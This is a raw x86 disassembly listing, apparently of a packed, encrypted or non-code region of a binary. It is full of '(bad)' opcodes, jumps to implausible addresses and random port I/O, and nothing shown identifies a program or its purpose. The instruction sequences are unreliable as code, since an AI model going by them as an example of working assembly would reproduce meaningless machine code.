  404d0d:	add    esi,DWORD PTR ds:0x57ede9b
  404d13:	pop    esp
  404d14:	jmp    0x1618ce1c
  404d19:	jmp    0x429cbaf
  404d1e:	ds pop ebx
  404d20:	es jg  0x404ca9
  404d23:	outs   dx,BYTE PTR ds:[esi]
  404d24:	push   es
  404d25:	fld    DWORD PTR [eax]
	...
  404d4f:	add    BYTE PTR [ecx+0x4e],bh
  404d52:	jmp    0x839b315a
  404d57:	add    edx,esp
  404d59:	pop    edx
  404d5a:	add    DWORD PTR [ebx],0xffffffb3
  404d5d:	fsub   st,st(1)
  404d5f:	call   0x8779cbbd
  404d64:	mov    ebx,0x49d8c67f
  404d69:	sub    ecx,esi
  404d6b:	mov    cs,WORD PTR [edx+0x6e]
  404d6e:	(bad)  
  404d6f:	fdivr  DWORD PTR [ecx]
  404d71:	or     BYTE PTR [ebp-0x1687a715],bh
  404d77:	add    esi,DWORD PTR ds:0x4d7ede9b
  404d7d:	pop    esp
  404d7e:	jmp    0x3211f386
  404d83:	inc    ebx
  404d84:	repz ror BYTE PTR ds:[ebx+0x7f],cl
  404d89:	pop    ebx
  404d8a:	adc    DWORD PTR [ecx+0x2],0xfe0c867e
  404d91:	dec    ebp
  404d92:	sar    BYTE PTR gs:[esi],cl
  404d95:	pop    ebx
  404d96:	add    cl,ch
  404d98:	mov    edx,0x9648daa
  404d9d:	outs   dx,BYTE PTR ds:[esi]
  404d9e:	jmp    DWORD PTR [esi+0xd]
  404da1:	sub    eax,ebp
  404da3:	call   0x4dfd:0xe2ff7de9
  404daa:	test   BYTE PTR [ebx],dh
  404dac:	cmp    eax,0x3870005b
  404db1:	jnp    0x404da2
  404db3:	add    BYTE PTR ds:[eax],al
	...
  404dde:	xchg   esi,eax
  404ddf:	iret   
  404de0:	test   DWORD PTR [ecx-0x6a],eax
  404de3:	jge    0x404de4
  404de5:	cdq    
  404de6:	adc    eax,0x3da847ed
  404deb:	jle    0x404da2
  404ded:	or     DWORD PTR [esi+0x4381ff7d],esp
  404df3:	pop    ebx
  404df4:	add    BYTE PTR [ecx-0x6b],ch
  404df7:	lods   al,BYTE PTR ds:[esi]
  404df8:	sti    
  404df9:	push   es
  404dfa:	xchg   esi,eax
  404dfb:	push   ecx
  404dfc:	shr    dh,0xf1
  404dff:	mov    bh,0x0
  404e01:	jmp    0xe9392843
  404e06:	ss aad 0x9c
  404e09:	jmp    0xde90a94b
  404e0e:	scas   eax,DWORD PTR es:[edi]
  404e0f:	jb     0x404e00
  404e11:	(bad)  
  404e12:	jno    0x404e3e
  404e14:	call   DWORD PTR [edx+ebp*2+0x2ac6ff6d]
  404e1b:	inc    esp
  404e1c:	cmc    
  404e1d:	mov    esi,0xc185cf09
  404e22:	and    DWORD PTR [ebp-0x1],edi
  404e25:	sbb    DWORD PTR [edx+0x422847fd],edx
  404e2b:	jl     0x404de2
  404e2d:	mov    DWORD PTR [ecx],ebx
  404e2f:	jge    0x404e30
  404e31:	add    DWORD PTR [ebx+ebx*2],edi
  404e34:	add    BYTE PTR [ecx+0x12],ch
  404e37:	out    dx,al
  404e38:	cli    
  404e39:	add    al,al
  404e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e3c:	or     eax,eax
  404e3e:	jmp    0x404e7c
  404e40:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  404e6b:	add    BYTE PTR [edi-0x2900008c],bh
  404e71:	push   cs
  404e72:	cmp    edx,DWORD PTR [eax-0x69]
  404e75:	rol    DWORD PTR [ebp-0x5b7f04],cl
  404e7b:	push   eax
  404e7c:	jg     0x404e04
  404e7e:	loop   0x404e80
  404e80:	xlat   BYTE PTR ds:[ebx]
  404e81:	dec    eax
  404e82:	lea    eax,[ebp-0x8bfd]
  404e88:	xlat   BYTE PTR ds:[ebx]
  404e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e8a:	mov    ch,0xec
  404e8c:	add    BYTE PTR [edi+edi*8-0x549e18],ah
  404e93:	(bad)  
  404e94:	jg     0x404e3b
  404e96:	mov    ch,0xe8
  404e98:	inc    eax
  404e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e9a:	call   DWORD PTR [eax+0x30]
  404e9d:	jmp    0xdbe8:0xa430efec
  404ea4:	jnp    0x404e4b
  404ea6:	(bad)  
  404ea7:	call   0x3fef43
  404eac:	cmp    al,0x37
  404eae:	lea    eax,[ebp-0x8aad]
  404eb4:	pop    ss
  404eb5:	outs   dx,DWORD PTR ds:[esi]
  404eb6:	fsub   st,st(2)
  404eb8:	addr16 pop eax
  404eba:	inc    eax
  404ebb:	push   eax
  404ebc:	loop   0x404e98
  404ebe:	cld    
  404ebf:	out    dx,eax
  404ec0:	jo     0x404e67
  404ec2:	push   eax
  404ec3:	(bad)  
  404ec4:	mov    edx,0xf0ffef74
  404ec9:	outs   dx,DWORD PTR ds:[esi]
  404eca:	mov    ah,0xf4
  404ecc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ece:	call   0x404fbc
	...
  404ef7:	add    BYTE PTR [eax],al
  404ef9:	add    al,ch
  404efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404efc:	(bad)  
  404efd:	(bad)  
  404efe:	jp     0x404f78
  404f00:	out    dx,eax
  404f01:	push   DWORD PTR [eax+0x3ef7de6f]
  404f07:	in     eax,0xd6
  404f09:	(bad)  
  404f0a:	mov    ebx,0xf9ffe6e5
  404f0f:	jmp    0x75d5:0xfcf1fe8e
  404f16:	jmp    0x6972:0x3ee3ced9
  404f1d:	add    cl,bl
  404f1f:	(bad)  
  404f21:	out    dx,eax
  404f22:	rcr    DWORD PTR [ebx+ebp*8],1
  404f25:	outs   dx,DWORD PTR ds:[esi]
  404f26:	shl    BYTE PTR [esi+edx*8],cl
  404f29:	push   0x3e
  404f2b:	or     eax,0x14a9ec90
  404f30:	(bad)  
  404f31:	call   0x169552
  404f36:	mov    ebx,0xa1efdeee
  404f3b:	sub    al,0x33
  404f3d:	call   ebx
  404f3f:	popa   
  404f40:	out    0xff,al
  404f42:	xchg   ecx,eax
  404f43:	imul   edi,DWORD PTR [edx-0x1d],0xc080723e
  404f4a:	push   es
  404f4b:	mov    ecx,0x646eb5d6
  404f50:	(bad)  
  404f51:	jmp    DWORD PTR [esi-0x33]
  404f54:	out    0xff,al
  404f56:	imul   edi,edx,0x6c51e87f
  404f5c:	aad    0xff
	...
  404f86:	add    BYTE PTR [eax],al
  404f88:	xchg   ebx,eax
  404f89:	test   eax,0xa951ffe5
  404f8e:	outs   dx,BYTE PTR ds:[esi]
  404f8f:	test   DWORD PTR [ecx-0x5c],0x32f632a1
  404f96:	add    al,0xff
  404f98:	repz test al,0xe5
  404f9b:	push   DWORD PTR [ecx]
  404f9d:	lea    ecx,[ecx-0x1e]
  404fa0:	test   BYTE PTR ds:[eax],cl
  404fa3:	shr    BYTE PTR [edx+0x268d888d],0x5c
  404faa:	xchg   esi,eax
  404fab:	aad    0x11
  404fad:	out    0x99,eax
  404faf:	mov    DWORD PTR [ebx+0x2d],ecx
  404fb2:	and    DWORD PTR [ebx+0x3e],eax
  404fb5:	outs   dx,BYTE PTR ds:[esi]
  404fb6:	inc    ebp
  404fb7:	aad    0xb3
  404fb9:	jg     0x404f51
  404fbb:	aad    0xf1
  404fbd:	cmp    DWORD PTR [ebx+0x645b3ee1],0x7f
  404fc4:	fimul  DWORD PTR [edx+0x7a6ed56e]
  404fca:	pushf  
  404fcb:	call   0xec9ecab1
  404fd0:	add    al,0x7e
  404fd2:	jmp    0xd1dc0ada
  404fd7:	dec    eax
  404fd8:	mov    ecx,0xb1e555b0
  404fdd:	jp     0x405030
  404fdf:	or     DWORD PTR [ecx-0x4474c986],ebx
  404fe5:	cmp    DWORD PTR [esi],0xffffffd5
  404fe8:	cdq    
  404fe9:	jp     0x405047
  404feb:	in     al,dx
	...
  405014:	add    BYTE PTR [eax],al
  405016:	mov    eax,ds:0x53ec1e7a
  40501b:	jb     0x405033
  40501d:	aad    0xdd
  40501f:	xor    DWORD PTR [ecx+0x3c7a3e42],esp
  405025:	loopne 0x405088
  405027:	jp     0x405027
  405029:	jmp    0x40507f
  40502b:	jl     0x405016
  40502d:	add    esi,DWORD PTR ds:0xc4f8759b
  405033:	call   0x7a923509
  405038:	jb     0x40500d
  40503a:	mov    ch,0x38
  40503c:	pop    ds
  40503d:	dec    esp
  40503e:	call   FWORD PTR [edx-0x26]
  405041:	lahf   
  405042:	cmp    DWORD PTR [eax+0x7a31e4cd],esi
  405048:	shl    DWORD PTR [edx-0x16ffa4e1],1
  40504e:	or     dh,BYTE PTR [eax+0x79f2bef0]
  405054:	call   0xffba6863
  405059:	sahf   
  40505a:	mov    eax,0xea96ef86
  40505f:	sbb    BYTE PTR [eax+0x7f],0x12
  405063:	jp     0x4050c4
  405065:	daa    
  405066:	add    eax,0xe172559e
  40506b:	add    al,0x8
  40506d:	sbb    edi,0xc66eff70
  405073:	mov    bh,bh
  405075:	sbb    al,0x4a
  405077:	and    eax,DWORD PTR [ecx-0x17]
	...
  4050a2:	add    BYTE PTR [eax],al
  4050a4:	ret    0xff5c
  4050a7:	fdiv   QWORD PTR ds:0xc4e542ea
  4050ad:	dec    edi
  4050ae:	nop
  4050af:	mov    cl,0xfc
  4050b1:	pop    edx
  4050b2:	leave  
  4050b3:	sub    ebp,DWORD PTR [ecx-0x669dab87]
  4050b9:	ffree  st(4)
  4050bb:	xor    DWORD PTR [edx-0x5e],ebp
  4050be:	inc    ebp
  4050bf:	and    DWORD PTR ds:0xbee9005b,edi
  4050c5:	test   DWORD PTR [edi],0xff4cf1e9
  4050cb:	xchg   esp,eax
  4050cc:	inc    ecx
  4050cd:	jp     0x405144
  4050cf:	icebp  
  4050d0:	out    0x5a,eax
  4050d2:	call   0xffb9d8d3
  4050d7:	pusha  
  4050d8:	and    BYTE PTR [edi-0x15],dh
  4050db:	out    0x9a,al
  4050dd:	pop    ds
  4050de:	cld    
  4050df:	jmp    0x7240ac21
  4050e4:	das    
  4050e5:	retf   
  4050e6:	dec    eax
  4050e7:	sub    BYTE PTR [edx],bh
  4050e9:	xchg   BYTE PTR [ebx],dl
  4050eb:	bound  eax,QWORD PTR [edi+0x60003b77]
  4050f1:	arpl   WORD PTR [ebp+0x9],si
  4050f4:	loopne 0x405118
  4050f6:	clc    
  4050f7:	add    DWORD PTR [edi],edx
  4050f9:	pop    ebp
  4050fa:	add    bl,ch
  4050fc:	and    edx,edi
  4050fe:	ds or  ebx,eax
  405101:	adc    ch,cl
  405103:	sub    DWORD PTR [edx],0xffffffa7
  405106:	add    BYTE PTR [ebp+0x0],dh
	...
  405131:	add    BYTE PTR [edi],bl
  405133:	mov    ?,WORD PTR [ebp-0x4]
  405136:	mov    edi,0xb8ffffe1
  40513b:	clc    
  40513c:	inc    esp
  40513d:	clc    
  40513e:	dec    eax
  40513f:	mov    dh,0xc2
  405141:	or     bh,dl
  405143:	xor    eax,0x37773d8b
  405148:	inc    ecx
  405149:	add    BYTE PTR [edi+esi*2+0x56],ch
  40514d:	mov    ebp,DWORD PTR [eax]
  40514f:	xchg   edi,eax
  405150:	imul   BYTE PTR ds:[eax-0x74]
  405154:	or     edi,edi
  405156:	xchg   edx,eax
  405157:	nop
  405158:	mov    DWORD PTR ds:0x413717,0x5c97
  405162:	enter  0x55a1,0x8b
  405166:	pop    ebx
  405167:	xor    al,0x56
  405169:	push   0xffffffa7
  40516b:	lea    esi,[ebp+0x8]
  40516e:	das    
  40516f:	int    0xf9
  405171:	jmp    FWORD PTR [eax]
  405173:	clc    
  405174:	idiv   edi
  405176:	shl    BYTE PTR [edi+eiz*8-0x15],cl
  40517a:	inc    edi
  40517b:	pop    edi
  40517c:	add    BYTE PTR [ebx+0xf765e3f],al
  405182:	rcr    ah,0x3f
  405185:	and    dl,dl
  405187:	jae    0x405184
  405189:	(bad)  
  40518a:	lock pop ebp
  40518c:	mov    ecx,eax
  40518e:	rcr    BYTE PTR fs:[edi+0x68],0x3e
  405193:	idiv   BYTE PTR [edx]
  405195:	inc    ecx
	...
  4051be:	add    BYTE PTR [eax],al
  4051c0:	ds xor esp,ebx
  4051c3:	push   0x1c
  4051c5:	add    BYTE PTR [ebx],0xb
  4051c8:	(bad)  
  4051c9:	sub    eax,0x867ec608
  4051ce:	add    ebp,DWORD PTR [edx+0x7a]
  4051d1:	sbb    al,0x4
  4051d3:	push   edi
  4051d4:	es and dh,ah
  4051d7:	add    BYTE PTR [esi],bh
  4051d9:	ins    DWORD PTR es:[edi],dx
  4051da:	ret    
  4051db:	je     0x405218
  4051dd:	enter  0x3,0xe5
  4051e1:	test   cl,cl
  4051e3:	pop    es
  4051e4:	ds pop ecx
  4051e6:	fsubr  QWORD PTR [eax-0x7cfc7e22]
  4051ec:	out    0x84,al
  4051ee:	pop    edx
  4051ef:	add    eax,DWORD PTR [eax]
  4051f1:	add    DWORD PTR [ebx],0x329ff98b
  4051f7:	leave  
  4051f8:	cld    
  4051f9:	jge    0x4051fe
  4051fb:	push   ebp
  4051fc:	mov    ch,0x1d
  4051fe:	xchg   ah,al
  405200:	mov    edx,0x3b0c47fc
  405205:	xor    bl,0xff
  405208:	test   eax,0xabc5dbd1
  40520d:	xor    dl,dl
  40520f:	mov    DWORD PTR [ebx],eax
  405211:	inc    esi
  405212:	shl    BYTE PTR [ebp+0x42],cl
  405215:	inc    ecx
  405216:	pop    eax
  405217:	cld    
  405218:	mov    esi,ecx
  40521a:	sti    
  40521b:	out    0x95,eax
  40521d:	push   esi
  40521e:	sar    bh,cl
  405220:	jns    0x4051f0
  405222:	repz inc BYTE PTR [eax]
	...
  40524d:	add    bl,ch
  40524f:	ins    DWORD PTR es:[edi],dx
  405250:	shl    BYTE PTR [ebp+0x6a],cl
  405253:	dec    ecx
  405254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405255:	or     DWORD PTR [esi],edi
  405257:	adc    dl,0x75
  40525a:	pop    edx
  40525b:	pop    ecx
  40525c:	mov    dh,ch
  40525e:	push   ecx
  40525f:	pop    edx
  405260:	out    0xbb,al
  405262:	jl     0x4052ca
  405264:	jmp    0x3fc7079f
  405269:	xor    eax,0xfc547691
  40526e:	sbb    ebp,edx
  405270:	leave  
  405271:	add    al,0x3e
  405273:	retf   
  405274:	bnd ret 
  405276:	stos   DWORD PTR es:[edi],eax
  405277:	pop    esi
  405278:	push   ss
  405279:	sub    eax,0xfcaba478
  40527e:	adc    edx,esp
  405280:	and    al,0xfc
  405282:	mov    ecx,0xb574c1e2
  405287:	lock in al,0x1c
  40528a:	(bad)  
  40528b:	ja     0x4052dd
  40528d:	shl    ecx,1
  40528f:	jbe    0x405217
  405291:	je     0x40527f
  405293:	lds    ebx,FWORD PTR [ecx-0x7c]
  405296:	and    DWORD PTR [ebx-0x3],ebx
  405299:	jmp    0x5bde:0x53810a70
  4052a0:	jmp    0xe630dca1
  4052a5:	xor    BYTE PTR [ebp+0x15],ah
  4052a8:	and    dh,al
  4052aa:	inc    esi
  4052ab:	pop    ebx
  4052ac:	pusha  
  4052ad:	or     bh,BYTE PTR [ebp+0xdced9d]
	...
  4052db:	add    BYTE PTR [eax+0x3e03e8b3],dl
  4052e1:	pop    ebx
  4052e2:	xchg   esi,eax
  4052e3:	sub    al,0xf8
  4052e5:	mov    ds:0xfe91fc2b,eax
  4052ea:	test   al,0x3c
  4052ec:	call   FWORD PTR [edx-0x6f]
  4052ef:	out    dx,al
  4052f0:	neg    BYTE PTR [ebx]
  4052f2:	jmp    0xeb724d2
  4052f7:	shl    esi,1
  4052f9:	loop   0x4052ad
  4052fb:	inc    edx
  4052fc:	add    ecx,DWORD PTR ds:[edi+0x5aff3d]
  405303:	add    edx,ebx
  405305:	jne    0x405306
  405307:	out    dx,al
  405308:	cmc    
  405309:	push   ds
  40530a:	dec    ebx
  40530b:	sub    BYTE PTR [edx+0x3],al
  40530e:	aaa    
  40530f:	xor    ch,bh
  405311:	pop    edx
  405312:	call   0xffb66267
  405317:	inc    ecx
  405318:	clc    
  405319:	and    DWORD PTR [ecx-0x17],eax
  40531c:	test   DWORD PTR [edi-0x7cc5d7b5],edi
  405322:	push   0xffffffb6
  405324:	out    dx,al
  405325:	jne    0x40538f
  405327:	icebp  
  405328:	push   edx
  405329:	sbb    al,0x0
  40532b:	adc    eax,esi
  40532d:	and    al,BYTE PTR [ecx-0x17]
  405330:	in     eax,0x11
  405332:	call   DWORD PTR [esi+0x2230030e]
  405338:	jge    0x405395
  40533a:	push   0x1c253b
  40533f:	xchg   ecx,eax
	...
  405368:	add    BYTE PTR [eax],al
  40536a:	and    DWORD PTR [esi-0x1],esi
  40536d:	jbe    0x4053e4
  40536f:	xlat   BYTE PTR ds:[ebx]
  405370:	dec    ebx
  405371:	sub    BYTE PTR [edx],bh
  405373:	add    esi,eax
  405375:	mov    bl,0x7c
  405377:	pop    ebx
  405378:	call   0xffb64299
  40537d:	rcr    ebp,0x21
  405380:	inc    ecx
  405381:	jmp    0xa88bb89b
  405386:	cmp    eax,0x8e3e2e83
  40538b:	jne    0x405350
  40538d:	pushf  
  40538e:	sbb    al,BYTE PTR [edi+0x6095a48b]
  405394:	rcr    BYTE PTR [ebp-0x16c724c0],0xe8
  40539b:	arpl   WORD PTR [eax+0x5b3de9],di
  4053a1:	and    BYTE PTR [ebx+0x5e],bh
  4053a4:	add    BYTE PTR [eax],al
  4053a6:	mov    WORD PTR [edi+0x61d717eb],gs
  4053ac:	pop    esp
  4053ad:	je     0x405419
  4053af:	fnstcw WORD PTR [eax]
  4053b1:	das    
  4053b2:	retf   0xba62
  4053b5:	add    DWORD PTR [edi+0x59],edx
  4053b8:	add    bl,ch
  4053ba:	pop    edx
  4053bb:	jecxz  0x4053bd
  4053bd:	add    BYTE PTR [edi],ah
  4053bf:	pop    ecx
  4053c0:	inc    eax
  4053c1:	or     BYTE PTR [edi+0x5f],0x75
  4053c5:	in     al,0xac
  4053c7:	cdq    
  4053c8:	leave  
  4053c9:	ret    0x591b
  4053cc:	push   ebp
  4053cd:	mov    eax,DWORD PTR [eax]
	...
  4053f7:	add    BYTE PTR [ebx],al
  4053f9:	sub    eax,0x229c5356
  4053fe:	or     al,0x5
  405400:	pop    ss
  405401:	pop    ebp
  405402:	add    BYTE PTR [eax],al
  405404:	(bad)  
  405405:	jg     0x405457
  405407:	call   0x3fe760
  40540c:	pop    esp
  40540d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540e:	mov    ebx,eax
  405410:	ins    BYTE PTR es:[edi],dx
  405411:	adc    cl,BYTE PTR [eax]
  405413:	mov    edx,DWORD PTR [edx]
  405415:	pop    ebx
  405416:	jmp    0x40541a
  405418:	mov    esi,DWORD PTR [esi]
  40541a:	or     ecx,ecx
  40541c:	retf   
  40541d:	arpl   WORD PTR [eax-0xaec32c2],ax
  405423:	or     ecx,DWORD PTR [esi]
  405425:	adc    eax,DWORD PTR [edx]
  405427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405428:	ficom  WORD PTR [ecx-0x40]
  40542b:	stos   BYTE PTR es:[edi],al
  40542c:	sbb    dh,BYTE PTR [esi-0x67d3198b]
  405432:	pop    ebx
  405433:	pop    esi
  405434:	shl    BYTE PTR [edi+0x29a708c2],0x56
  40543b:	mov    ecx,0x589b
  405440:	pop    es
  405441:	dec    eax
  405442:	rcl    BYTE PTR [eax-0x536f3e9c],cl
  405448:	ds repnz (bad) 
  40544b:	mov    ch,0x7e
  40544d:	(bad)  
  405450:	into   
  405451:	test   DWORD PTR [eax+edx*4],0x900e40bd
  405458:	std    
  405459:	lods   eax,DWORD PTR ds:[esi]
  40545a:	push   ds
  40545b:	nop
	...
  405484:	add    BYTE PTR [eax],al
  405486:	retf   
  405487:	jnp    0x4054fc
  405489:	cmp    DWORD PTR [ebp+edi*1+0x74],0x43
  40548e:	add    dl,BYTE PTR [edx+0x74]
  405491:	jl     0x4054d7
  405493:	dec    esi
  405494:	or     eax,0x77fb190
  405499:	add    al,0x3d
  40549b:	rol    BYTE PTR [edx+0x3c],cl
  40549e:	jg     0x4054b2
  4054a0:	dec    edi
  4054a1:	or     ebx,DWORD PTR [edx+0x48]
  4054a4:	je     0x405525
  4054a6:	cmp    BYTE PTR [esi+0x44],dh
  4054a9:	nop
  4054aa:	cmp    eax,0x9f3c42b2
  4054af:	repnz dec esi
  4054b1:	or     bh,BYTE PTR [edx]
  4054b3:	dec    eax
  4054b4:	je     0x405535
  4054b6:	cmp    esi,DWORD PTR [esi+0x410e0346]
  4054bc:	(bad)
  4054bf:	loopne 0x405455
  4054c1:	rol    DWORD PTR [esp+eax*4],0x7a
  4054c5:	ret    0xba41
  4054c8:	(bad)  
  4054c9:	call   0x8bb3fe04
  4054ce:	cmc    
  4054cf:	icebp  
  4054d0:	sub    al,0x5b
  4054d2:	jge    0x40548a
  4054d4:	jp     0x4054c2
  4054d6:	or     eax,0xb5fc35ad
  4054db:	mov    dh,0xfb
  4054dd:	(bad)  
  4054de:	mov    ch,0xb6
  4054e0:	repz pop ebp
  4054e3:	mov    esi,0x494d8fff
  4054e8:	loop   0x40550c
	...
  405512:	add    BYTE PTR [eax],al
  405514:	scas   al,BYTE PTR es:[edi]
  405515:	pop    edx
  405516:	mov    eax,0x1de89673
  40551b:	into   
  40551c:	jns    0x4054e8
  40551e:	ins    BYTE PTR es:[edi],dx
  40551f:	mov    esp,0xc44362f0
  405524:	push   esi
  405525:	bound  ebx,QWORD PTR [ecx+0x42]
  405528:	pop    esp
  405529:	jb     0x405584
  40552b:	sub    al,0xae
  40552d:	xlat   BYTE PTR ds:[ebx]
  40552e:	das    
  40552f:	pop    es
  405530:	scas   al,BYTE PTR es:[edi]
  405531:	xlat   BYTE PTR ds:[ebx]
  405532:	add    BYTE PTR [edi],al
  405534:	scas   al,BYTE PTR es:[edi]
  405535:	repz (bad) 
  405537:	je     0x4054ee
  405539:	xchg   edi,eax
  40553a:	jns    0x40556a
  40553c:	cdq    
  40553d:	push   ss
  40553e:	mov    al,ds:0x345b42c2
  405543:	jns    0x40555f
  405545:	(bad)  [ebp-0x418cdf20]
  40554b:	xor    DWORD PTR [ebp-0x6a],esp
  40554e:	fs inc edi
  405550:	adc    cl,BYTE PTR [ecx+eax*2]
  405553:	imul   esi,DWORD PTR [esi+0x1c],0xffffffe9
  405557:	int3   
  405558:	dec    ebx
  405559:	shl    DWORD PTR [ecx],0x43
  40555c:	xor    DWORD PTR ds:[ebx-0x53],0x3e
  405561:	pop    ebx
  405562:	loop   0x405527
  405564:	jae    0x4055a3
  405566:	xchg   BYTE PTR [edi+0x4e],dl
  405569:	jb     0x40555f
  40556b:	jmp    DWORD PTR [edi+0x5e]
  40556e:	add    eax,DWORD PTR [ecx+edx*8]
  405571:	call   0x6f942256
  405576:	push   ecx
  405577:	test   DWORD PTR [eax],eax
	...
  4055a1:	add    cl,ah
  4055a3:	pop    ebx
  4055a4:	jmp    0xe8294fa1
  4055a9:	inc    eax
  4055aa:	mov    cl,0xe8
  4055ac:	dec    esp
  4055ad:	fcomp  QWORD PTR [edx+edx*4]
  4055b0:	jmp    0xeed68ab8
  4055b5:	xchg   BYTE PTR [ebx+0x3de9005b],al
  4055bb:	loopne 0x405542
  4055bd:	cmp    bh,BYTE PTR [eax+0x72]
  4055c0:	(bad)  
  4055c1:	mov    ecx,0xe90156e5
  4055c6:	cmp    eax,0x3a374d83
  4055cb:	pop    ebx
  4055cc:	or     ebp,DWORD PTR [ecx]
  4055ce:	imul   ebx,esi,0xffffffac
  4055d1:	jmp    0xe57db113
  4055d6:	cmp    al,0x5b
  4055d8:	add    dh,ah
  4055da:	mov    edx,0x3de900bc
  4055df:	add    eax,0x6eb87400
  4055e4:	(bad)  
  4055e5:	fimul  WORD PTR [edx]
  4055e7:	or     ebp,eax
  4055e9:	sbb    esp,eax
  4055eb:	pop    edx
  4055ec:	add    BYTE PTR [eax+eax*8+0x6d],bl
  4055f0:	inc    dh
  4055f2:	repnz or ch,al
  4055f5:	sub    DWORD PTR [eax],ecx
  4055f7:	jb     0x4055f8
  4055f9:	loop   0x4055f8
  4055fb:	out    0x1b,eax
  4055fd:	inc    ecx
  4055fe:	test   BYTE PTR [ebx],ah
  405600:	inc    ecx
  405601:	jmp    0xa0342e86
	...
  40562e:	add    BYTE PTR [eax],al
  405630:	or     dh,BYTE PTR [edx+0x50]
  405633:	add    DWORD PTR [edi-0x5710097],0x21907e7
  40563d:	cwde   
  40563e:	idiv   BYTE PTR [esi+0xa]
  405641:	xchg   BYTE PTR [edi],cl
  405643:	jbe    0x4056ad
  405645:	arpl   WORD PTR [ebp-0x8f119c],cx
  40564b:	or     ax,0x6083
  40564f:	push   edi
  405650:	mov    dh,BYTE PTR [ecx-0x77]
  405653:	ins    BYTE PTR es:[edi],dx
  405654:	xchg   ecx,eax
  405655:	jo     0x405656
  405657:	dec    esi
  405658:	pop    es
  405659:	pop    ebx
  40565a:	push   0x0
  40565c:	xchg   edi,eax
  40565d:	adc    eax,DWORD PTR [edx]
  40565f:	push   0xffffffa7
  405661:	adc    eax,DWORD PTR [ebx]
  405663:	push   0xc0005da7
  405668:	pop    eax
  405669:	leave  
  40566a:	in     al,dx
  40566b:	(bad)  
  40566c:	pop    eax
  40566d:	lahf   
  40566e:	call   0x9e90d2
  405673:	mov    DWORD PTR [edx+0x6f7440a5],esp
  405679:	sahf   
  40567a:	jne    0x40568c
  40567c:	cmp    BYTE PTR [ecx],cl
  40567e:	or     al,0xff
  405680:	shl    BYTE PTR [ebp-0x60c50818],cl
  405686:	dec    DWORD PTR [ebx-0x78a60d1]
  40568c:	outs   dx,DWORD PTR ds:[esi]
  40568d:	xor    ebx,ebp
  40568f:	add    BYTE PTR [edi],ah
  405691:	jb     0x40566d
  405693:	jne    0x405695
	...
  4056bd:	add    BYTE PTR [esi+eiz*4],bl
  4056c0:	mov    ch,0xec
  4056c2:	stc    
  4056c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c4:	(bad)  
  4056c5:	call   0x411971
  4056ca:	fmul   st,st(2)
  4056cc:	in     al,dx
  4056cd:	dec    al
  4056cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d0:	call   0xffe51c3e
  4056d5:	mov    edx,esp
  4056d7:	inc    eax
  4056d8:	leave  
  4056d9:	ret    0x5ceb
  4056dc:	push   ebp
  4056dd:	mov    edi,DWORD PTR [ebx-0x46133b2a]
  4056e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056e4:	call   DWORD PTR [ebx-0x48]
  4056e7:	or     cl,BYTE PTR [edi+edi*8]
  4056ea:	shl    BYTE PTR [edi+eiz*2-0x67],cl
  4056ee:	pop    ds
  4056ef:	push   ss
  4056f0:	add    bh,bh
  4056f2:	xchg   edx,eax
  4056f3:	ror    BYTE PTR [eax+0x41],cl
  4056f6:	xlat   BYTE PTR ds:[ebx]
  4056f7:	xchg   esp,eax
  4056f8:	pop    edx
  4056f9:	cmc    
  4056fa:	sbb    BYTE PTR [ebx+ecx*1-0x7f86c140],ah
  405701:	fidivr DWORD PTR [esi]
  405703:	add    BYTE PTR [ebx],0x2b
  405706:	test   edi,esp
  405708:	sub    bh,0x98
  40570b:	xor    ebx,ecx
  40570d:	push   eax
  40570e:	es jle 0x405715
  405711:	add    BYTE PTR [esi],bh
  405713:	sbb    dh,BYTE PTR [ebx]
  405715:	fnstsw WORD PTR [esi]
  405717:	cmp    dh,0xbf
  40571a:	dec    ecx
  40571b:	test   BYTE PTR [eax+0x8823e00],0x4
	...
  40574a:	add    BYTE PTR [eax],al
  40574c:	aas    
  40574d:	add    BYTE PTR [ebx],0xf
  405750:	mov    ecx,0x3e000434
  405755:	inc    DWORD PTR [eax-0x4]
  405758:	out    dx,al
  405759:	pop    ecx
  40575a:	pop    edi
  40575b:	jmp    0x85b8d8a9
  405760:	push   ecx
  405761:	js     0x40572d
  405763:	dec    DWORD PTR [esi+0x31fd3a8a]
  405769:	mov    esi,edi
  40576b:	mov    edi,0x8a5b7eb3
  405770:	jbe    0x4057b5
  405772:	add    al,0x8d
  405774:	ret    
  405775:	mov    al,ds:0x5211ffc9
  40577a:	fmul   QWORD PTR [ecx-0x353eed]
  405780:	mov    ebp,DWORD PTR [edx+0x33]
  405783:	call   0xb1e9a
  405788:	in     eax,0x78
  40578a:	retf   0x3675
  40578d:	jo     0xcb193882
  405793:	push   eax
  405794:	out    0x60,al
  405796:	sar    edi,1
  405798:	rcl    DWORD PTR [ecx-0x35],1
  40579b:	jne    0x405767
  40579d:	push   ecx
  40579e:	fsub   QWORD PTR ds:0xca665ad5
  4057a4:	inc    ebp
  4057a5:	fwait
  4057a6:	aad    0x36
  4057a8:	mov    cl,0xe5
  4057aa:	push   esp
  4057ab:	fcmovnbe st,st(0)
  4057ad:	or     DWORD PTR [esi-0x36],0x0
	...
  4057d8:	add    BYTE PTR [eax],al
  4057da:	mov    bh,0x15
  4057dc:	inc    ecx
  4057dd:	xchg   BYTE PTR [ebx],bl
  4057df:	jae    0x4057ca
  4057e1:	dec    edi
  4057e2:	cld    
  4057e3:	(bad)  [edi+ecx*8-0x384b9012]
  4057ea:	xchg   esi,eax
  4057eb:	mov    ecx,0xd63e0344
  4057f0:	sub    DWORD PTR [ebx+0x2c],ecx
  4057f3:	jo     0x405791
  4057f5:	iret   
  4057f6:	push   esi
  4057f7:	in     eax,0x2c
  4057f9:	add    edi,DWORD PTR [esi]
  4057fb:	sub    DWORD PTR fs:[edi+0x20],ecx
  4057ff:	or     edi,esi
  405801:	dec    edi
  405802:	push   esi
  405803:	or     BYTE PTR [edx-0x2c],0x49
